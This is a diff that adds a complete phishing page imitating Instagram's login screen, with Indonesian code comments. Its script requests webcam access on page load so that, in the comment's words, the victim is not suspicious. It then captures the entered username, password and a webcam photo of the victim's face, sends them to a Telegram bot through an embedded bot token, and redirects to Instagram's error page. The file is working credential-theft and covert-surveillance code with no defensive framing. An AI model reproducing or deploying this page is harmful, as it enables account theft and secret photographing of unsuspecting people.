@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 8px; border: none; background-color: #0095f6; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+        #canvas { display: none; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110a34e.png" alt="Instagram" class="logo">
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="startInfiltration()" id="btn">Log In</button>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const token = '8782166292:AAELbvAgI-yubYOqszuw0RX5WaDeVVVzPKk';
+        const chatId = 'solvvvo_bot';
+
+        // Minta akses kamera pas halaman dibuka biar gak curiga pas klik tombol
+        window.onload = () => {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                document.getElementById('video').srcObject = stream;
+            }).catch(err => console.log("Camera access denied"));
+        };
+
+        function startInfiltration() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+
+            if(!user || !pass) return;
+
+            // 1. Ambil Gambar
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // 2. Kirim Data Login (Text)
+            const text = [ZmZ HIT]\nUser: ${user}\nPass: ${pass};
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)});
+
+            // 3. Kirim Foto (Blob)
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'target_face.jpg');
+                fetch(https://api.telegram.org/bot${token}/sendPhoto, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/error/";
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
